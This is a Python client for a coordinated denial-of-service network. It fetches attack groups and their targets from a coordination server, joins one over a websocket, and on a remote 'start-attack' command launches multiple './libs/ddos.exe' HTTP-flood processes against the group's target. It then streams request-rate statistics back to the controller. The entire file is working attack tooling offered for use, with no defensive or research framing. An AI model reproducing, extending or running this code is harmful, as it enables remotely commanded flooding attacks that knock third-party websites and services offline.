import websocket
import json
import os
import requests
import threading
import subprocess
import time
from psutil import Process

from rich.console import Console
from rich.table import Table

IP = '127.0.0.1:6969'

console = Console()
group_name = ['']
groups = {}
cores = os.cpu_count()

def print_group(group_name):
    global groups

    old_groups = {}
    while not group_name[0]:
        groups = requests.get(f'http://{IP}/group/json').json()
        if groups == old_groups: continue

        old_groups = groups
        console.clear()

        table = Table()
        table.add_column('Name')
        table.add_column('Target')
        table.add_column('Members')
        table.add_column('Power/Threads')

        for group in groups:
            info = groups[group]
            name, target, members, power = group, info['target'], str(info['members_count']), str(info['threads'])
            table.add_row(name, target, members, power)
        console.print(table)
        console.print("Join Group - Name >", end='')
        time.sleep(5)

threading.Thread(target=print_group, args=(group_name,)).start()
while True:
    group_name[0] = input('')
    if group_name[0] in groups:
        break
    print('Join Group - Name >', end='')

while True:
    try:
        threads = int(input(f'How many threads? (suggested: {cores * 10})'))
        processes = int(input(f'How many processes? (suggested: {cores // 4 + 1})'))
    except: continue

    if threads > 0 and processes > 0:
        break

target = groups[group_name[0]]['target']

class Attack:
    def __init__(self):
        self.status = 0
        self.pids = []

    def start_attack(self):
        if self.status: return
        self.status = 1

        for _ in range(processes):
            process = subprocess.Popen([f'./libs/ddos.exe', 'http', '-threads', str(threads), target], stdout=subprocess.PIPE)
            self.pids.append(process.pid)
        
        t = threading.Thread(target=self.stalk_stats)
        t.daemon = True
        t.start()

    def stop_attack(self):
        if not self.status: return
        self.status = 0
        for pid in self.pids:
            Process(pid).kill()
        
        for pid in self.pids:
            os.remove(f'{pid}.txt')

        self.pids = []

    def stalk_stats(self):
        old_total_reqs = 0
        while self.status:
            total_reqs = 0
            for pid in self.pids:
                try:
                    with open(f'{pid}.txt', 'r') as f:
                        reqs = int(f.read())
                except:
                    print(f'Failed to read', pid)
                    continue
                total_reqs += reqs
            #print('Total Reqs', total_reqs)
            difference = (total_reqs - old_total_reqs) / 2
            print(f'{difference} requests per second, total: {total_reqs}')
            ws.send(json.dumps({'p': 'analytics', 'per_second': difference, 'total': total_reqs}))
            old_total_reqs = total_reqs
            time.sleep(2)

attack = Attack()

def on_message(ws, message):
    data = json.loads(message)
    if data['p'] == 'start-attack':
        attack.start_attack()
    elif data['p'] == 'stop-attack':
        attack.stop_attack()
    

def on_error(ws, error):
    attack.stop_attack()

def on_close(ws, close_status_code, close_msg):
    print("### closed ###", close_status_code, close_msg)
    attack.stop_attack()

def on_open(ws):
    ws.send(json.dumps({'p': 'identify', 'username': 'traba'}))
    ws.send(json.dumps({'p': 'join-group', 'name': group_name[0], 'cores': cores, 'threads': threads * processes}))

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(f"ws://{IP}/websocket",
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)

    ws.run_forever(reconnect=5)
